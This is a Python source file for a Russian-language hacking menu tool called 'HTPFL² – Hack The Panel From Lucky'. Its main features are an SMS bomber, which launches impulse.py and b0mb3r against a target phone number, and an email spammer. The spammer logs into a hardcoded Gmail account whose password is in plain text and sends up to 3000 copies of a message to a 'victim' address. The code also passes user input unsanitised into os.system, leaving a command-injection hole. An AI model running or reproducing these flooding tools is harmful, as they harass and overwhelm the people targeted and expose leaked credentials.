import platform, os, sys, requests, random
from time import strftime, sleep
from termcolor import colored

import smtplib                                      # Импортируем библиотеку по работе с SMTP

# Добавляем необходимые подклассы - MIME-типы
from email.mime.multipart import MIMEMultipart      # Многокомпонентный объект
from email.mime.text import MIMEText                # Текст/HTML
from email.mime.image import MIMEImage

if platform.system() == "Windows":
	print("")
	print(colored("HTPFL Doesn't work on Windows", "red"))
	print("")
	sys.exit(0)

os.system("clear")

# Проверка сети
def ICC():
	try:
		requests.get("https://google.com", timeout=4)
	except:
		print(colored("[!]", "red"), colored("Ваше устройство не подключено к интернету", "magenta"))
		print(colored("[✓]", "green"), colored("С уважением HTPFL", "megenta"))
		print("")
		sys.exit(0)
		
print("")
print(colored("Checking your Internet connection...", "green"))
print("")
ICC()


#Баннер
def Banner():
	os.system("clear")
	colors = random.choice(["red", "blue", "magenta", "green", "cyan"])
	banner = '''
    ▄▄    ▄▄  ▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄    ▄▄▄▄▄▄▄▄  ▄▄
    ██    ██  ▀▀▀██▀▀▀  ██▀▀▀▀█▄  ██▀▀▀▀▀▀  ██
    ██    ██     ██     ██    ██  ██        ██
    ████████     ██     ██████▀   ███████   ██
    ██    ██     ██     ██        ██        ██
    ██    ██     ██     ██        ██        ██▄▄▄▄▄▄
    ▀▀    ▀▀     ▀▀     ▀▀        ▀▀        ▀▀▀▀▀▀▀▀
	'''
	print(colored(banner, colors))
	print("      ", colored("~[", "red")+colored("HTPFL²", "green"), colored("-", "blue"), colored("Hack The Panel From Lucky", "green")+colored("]~", "red"))
	print("               ", colored("~[", "red")+colored("CodeName", "magenta"),colored(":", "blue")+colored("Lucky", "green")+colored("]~", "red"))
	print("              ", colored("~[", "red")+colored("Version", "magenta"), colored(":", "blue")+ colored("2.0 Beta", "red")+colored("]~", "red"))
	print("          ", colored("~[", "red")+colored("Latest Update", "magenta"), colored(":")+colored("XX.XX.2020", "red")+colored("]~", "red"))
	vi = open("%/vip.txt", "r")
	vip = vi.read()
	if vip == "True":
		nam = open("name.txt", "r")
		name = nam.read()
		print("                 ", colored("~[", "red")+colored("Name", "magenta"), colored("-", "blue"), colored(name, "red")+colored("]~", "red"))
		print("")
	else:
		print("")
	print(colored("[1]", "red"), colored("Category", "cyan"), colored("Spymers", "green"))
	print(colored("[2]", "red"), colored("Category", "cyan"), colored("Frameworks", "red"))
	print("")
	print(colored("[99]", "red"), colored("О Программе", "cyan"))
	print("")
	print(colored("[Act]", "red"), colored("Действия Панели", "green"))
	print(colored("[Set]", "red"), colored("Настройки", "magenta"))
	print(colored("[Doc]", "red"), colored("Документации", "yellow"))
	print(colored("[0] Выход", "red"))
	print("")
Banner()

def osnova():
	while True:
		About()
		
def spymers():
		print("")
		print(colored("[1]", "red"), colored("Sms Bomber", "green"))
		print("")
		print(colored("[2]", "red"), colored("Email Spam", "magenta"))
		print("")
		print("")
		print(colored("[0] Назад", "red"))
		print("")
		spy = input(colored(" ~# ", "red"))
		if spy == "0" or spy == "Назад":
			while True:
				Banner()
				osnova()
		elif spy == "1":
			vi = open("%/vip.txt", "r")
			vip = vi.read()
			if vip == "True":
				try:
					import wget
					import humanfriendly
					ok = colored("[✓]", "green")
				except:
					ok = colored("[×]", "red")
			else:
				ok = " "
			vi.close()
			print("")
			print(colored("⟨Starting Bombers⟩", "blue"))
			imp = colored("[1]", "red")
			start = colored("Start", "green")
			imp3 = colored("Īmpūlse", "magenta")
			# —
			bom = colored("[2]", "red")
			bom2 = colored("b0mb3r", "red")
			print(imp, start, imp3)
			print(bom, start, bom2)
			print("")
			print(colored("⟨Download Modules and Bomber⟩", "blue"))
			dow = colored("[3]", "red")
			dow2 = colored("[4]", "red")
			dow3 = colored("Download modules for ", "yellow")
			dow4 = colored("Download", "yellow")
			print(dow, dow3 + imp3, ok)
			print(dow2, dow4, bom2)
			print("")
			print("")
			print(colored("[0] Назад", "red"))
			print("")
			bom = input(colored(" ~# ", "red"))
			if bom == "1":
				print("")
				number = input(colored("Number +", "red"))
				print("")
				print(colored("Mode", "magenta"))
				print(colored("[1]", "red"), colored("Easy", "green"))
				print(colored("[2]", "red"), colored("Normal", "yellow"))
				print(colored("[3]", "red"), colored("Fast", "red"))
				print("")
				mod = input(colored(" ~# ", "red"))
				if mod == "1":
					mods = "5"
				elif mod == "2":
					mods = "15"
				elif mod == "3":
					mods = "200"
				else:
					print("")
					print(colored("InvalidMode", "red"))
					print("")
					sys.exit(0)
				print("")
				print(colored("Time in Seconds", "green"))
				time = input(colored("Time: ", "magenta"))
				try:
					os.system("cd % && python impulse.py --target "+number+" --method SMS --time "+time+" --threads "+mods)
				except KeyboardInterrupt:
					while True:
						spymer()
			elif bom == "2" or bom == "b0mb3r":
				print("")
				print(colored("Start localhost", "green"))
				try:
					os.system("b0mb3r")
				except KeyboardInterrupt:
					spymers()
			elif bom == "3":
				print("")
				print(colored("Starting...", "green"))
				os.system("pip install wget")
				os.system("pip install humanfriendly")
				print("")
				print(colored("Complete!", "green"))
			elif bom == "4":
				print("")
				print(colored("Starting...", "green"))
				os.system("pip install b0mb3r -U")
				print("")
				print(colored("Complete!", "green"))
			elif bom == "0" or bom == "Назад":
				spymers()
			else:
				print("")
				print(colored("InvalidOption", "red"))
				print("")
				sys.exit(0)
		elif spy == "2" or spy == "Email Spam":
			vi = open("%/vip.txt", "r")
			vip = vi.read()
			if vip != "True":
				#Free
				print("")
				print(colored("[1]", "cyan"), colored("start", "green"))
				print("")
				print("")
				print(colored("[0] Назад", "red"))
				print("")
				es = input(colored(" ~# ", "red"))
				if es == "1" or es == "start":
					print("")
					print(colored("Введите сообщение при отправке", "yellow"))
					soob = input(colored(" ~# ", "red"))
					print("")
					print(colored("Введите количество писем\nМаксимум 500", "yellow"))
					sms = int(input(colored(" ~# ", "red")))
					if sms > 500 or sms < 1:
						print("")
						print(colored("InvalidQuantity", "red"))
						print("")
						sys.exit(0)
					# --
					print("")
					Email1 = input(colored("Email ", "magenta"))
					print("")
					addr_from = "sanddata222@gmail.com"  # Адресат
					addr_to = Email1  # Получатель
					password = "passsanddata222"  # Пароль
					msg = MIMEMultipart()  # Создаем сообщение
					msg['From'] = addr_from  # Адресат
					msg['To'] = addr_to  # Получатель
					msg['Subject'] = soob  # Тема сообщения
					body = soob
					msg.attach(MIMEText(body, soob))  # Добавляем в сообщение текст
		
					server = smtplib.SMTP('smtp.gmail.com', 587)  # Создаем объект SMTP
		#server.set_debuglevel(True)  # Включаем режим отладки - если отчет не нужен, строку можно закомментировать
					server.starttls()  # Начинаем шифрованный обмен по TLS
					try:
						server.login(addr_from, password)
					except:
						print("")
						print(colored("Email Устарел!\nСообщите разработчику о данной ошибки\nЭто важно!", "red"))
						print("")
						sleep(7)
						while True:
							Banner()
							osnova()
		
					qwer_t = 0
					rebut_o = 0
					rebut_e = 0
		
					while qwer_t < sms:
						try:
							os.system("clear")
							print("")
							server.send_message(msg)
							print(colored("Отправлено ", "green") + colored(rebut_o+1, "cyan"))
							print("")
							rebut_o += 1
							qwer_t += 1
							sleep(1.35)
						except KeyboardInterrupt:
							while True:
								Banner()
								print("")
								print(colored(" ~# ", "red")+("1"))
								spymers()
						except:
							os.system("clear")
							print("")
							server.send_message(msg)
							print(colored("Не отправлено ", "green") + colored(rebut_e+1, "cyan"))
							print("")
							rebut_e += 1
							qwer_t += 1
							sleep(1.35)
					server.quit()
					os.system("clear")
					print("")
					print(colored("Spam Completed!", "green"))
					print("")
					sleep(2)
					while True:
						Banner()
						osnova()  # Выходим
				elif es == "0" or es == "Назад":
					while True:
						Banner()
						print("")
						print(colored(" ~# ", "red")+("1"))
						spymers()
			else:
				#Vip
				print("")
				print(colored("[1]", "cyan"), colored("start", "green"))
				print("")
				print("")
				print(colored("[0] Назад", "red"))
				print("")
				es = input(colored(" ~# ", "red"))
				if es == "1" or es == "start":
					print("")
					print(colored("Введите почту жертвы", "magenta"))
					Email1 = input(colored(" ~# ", "red"))
					print("")
					print(colored("Сообщение при отправке", "yellow"))
					soob = input(colored(" ~# ", "red"))
					print("")
					print(colored("Количество писем\nМаксимум 3000", "green"))
					sms = input(colored(" ~# ", "red"))
					if int(sms) > 3000 or int(sms) < 1:
						print("")
						print(colored("InvalidQuantity", "red"))
						print("")
						sys.exit(0)
					addr_from = "sanddata222@gmail.com"  # Адресат
					addr_to = Email1  # Получатель
					password = "passsanddata222"  # Пароль
					msg = MIMEMultipart()  # Создаем сообщение
					msg["From"] = addr_from  # Адресат
					msg["To"] = addr_to  # Получатель
					msg["Subject"] = soob  # Тема сообщения
					body = soob
					msg.attach(MIMEText(body, soob))  # Добавляем в сообщение текст
		
					server = smtplib.SMTP('smtp.gmail.com', 587)  # Создаем объект SMTP
		#server.set_debuglevel(True)  # Включаем режим отладки - если отчет не нужен, строку можно закомментировать
					server.starttls()  # Начинаем шифрованный обмен по TLS
					try:
						server.login(addr_from, password)
					except:
						print("")
						print(colored("Email Устарел!\nСообщите разработчику о данной ошибки\nЭто важно!", "red"))
						print("")
						sleep(7)
						while True:
							Banner()
							osnova()
					rfb = 0
					rfb2 = 0
					while rfb < int(sms):
						os.system("clear")
						try:
							print("")
							server.send_message(msg)
							print(colored("SUCCESS", "green"), colored(rfb+1, "cyan"))
							print("")
							rfb += 1
						except KeyboardInterrupt:
							while True:
								Banner()
								print("")
								print(colored(" ~# ", "red")+("1"))
								spymers()
						except:
							os.system("clear")
							print("")
							print(colored("ERROR", "red"), colored(rfb2+1, "cyan"))
							print("")
							rfb += 1
					server.quit()
					os.system("clear")
					print("")
					print(colored("Spam Finished!!", "green"))
					print("")
					sleep(2)
					while True:
						Banner()
						print("")
						print(colored(" ~# ", "red")+("1"))
						spymers()
				elif es == "0" or es == "Назад":
					while True:
						Banner()
						print("")
						print(colored(" ~# ", "red")+("1"))
						spymers()

def programm():
	vi = open("%/vip.txt", "r")
	vip = vi.read()
	if vip == "True":
		st = "VIP"
	else:
		st = "Free"
	print("")
	print(colored("Status ", "red")+colored("- ", "blue")+ colored(st, "yellow"))
	print("")
	name = colored("Lucky", "red")
	raz = colored("Developer -", "cyan")
	print(raz, name)
	vr = colored("2.0 Beta", "blue")
	ver = colored("Version -", "cyan")
	print(ver, vr)
	lang = colored("Python", "green")
	lan = colored("Language -", "cyan")
	print(lan, lang)
	vk = colored("https://m.vk.com/id554311036", "magenta")
	vkp = colored("VK -", "cyan")
	print(vkp, vk)
	tg = colored("https://t.me/HTPFLcom", "cyan")
	tgo = colored("Telegram -", "blue")
	print(tgo, tg)
	print("")
	print("")
	print(colored("[0] Назад", "red"))
	print("")
	sled = input(colored(" ~# ", "red"))
	if sled == "0" or sled == "Назад":
		while True:
			Banner()
			osnova()
			

def act():
	print("")
	print(colored("[1]", "red"), colored("Update", "green"))
	print(colored("[2]", "red"), colored("Update all Modules", "yellow"))
	print("")
	print("")
	print(colored("[0] Назад", "red"))
	print("")
	Act = input(colored(" ~# ", "red"))
	if Act == "1":
		print("")
		print(colored("Starting Update...", "green"))
		print("")
		sleep(0.1)
		sys.exit(0)
	elif Act == "2":
		print("")
		print(colored("ВНИМАНИЕ!", "red"), colored("\nОбновление всех модулей может занять немало времени, вы согласны?\nY/N", "magenta"))
		print("")
		podt = input(colored(" ~# ", "red"))
		if podt == "Y" or podt == "y":
			print("")
			print(colored("Starting...", "green"))
			print("")
			while True:
				Banner()
				osnova()
		elif podt == "N" or podt == "n":
			while True:
				Banner()
				print("")
				print(colored(" ~# ", "red"), "act")
				act()
	else:
		while True:
			Banner()
			osnova()
		

def set():
	print("")
	vi = open("%/vip.txt", "r")
	vip = vi.read()
	if vip == "True":
		print("")
		print(colored("[1]", "red"), colored("Изменить Ник", "cyan"))
		print("")
		print("")
		print(colored("[0] Назад", "red"))
		print("")
		Set = input(colored(" ~# ", "red"))
		if Set == "1":
			print("")
	else:
		print("")
		print(colored("Для вашего статуса еще не существует настроек", "magenta"))
		print("")
		sleep(2.7)
		while True:
			Banner()
			osnova()





def About():
	global numb
	numb = input(colored(" ~# ", "red"))
	if numb == "1":
		while True:
			spymers()
	elif numb == "2":
		print(colored("Данная категория еще не работает", "red"))
		sleep(3)
		while True:
			Banner()
			osnova()
	elif numb == "99":
		while True:
			programm()
	elif numb == "Act" or numb == "act":
		while True:
			act()
	elif numb == "Set" or numb == "set":
		while True:
			set()
	elif numb == "Doc" or numb == "doc":
		print(colored("Данный пункт еще не работает", "red"))
		sleep(3)
		while True:
			Banner()
			osnova()
	elif numb == "0" or numb == "Выход":
		os.system("clear")
		print("")	
		by = random.choice(["GodBye!", "Bye!", "Have a good Day!"])
		print(colored(by, "green"))
		print("")
		sys.exit(0)
	else:
		os.system("clear")
		print("")
		print(colored("InvalidOption", "red"))
		print("")
		sys.exit(0)
		
About()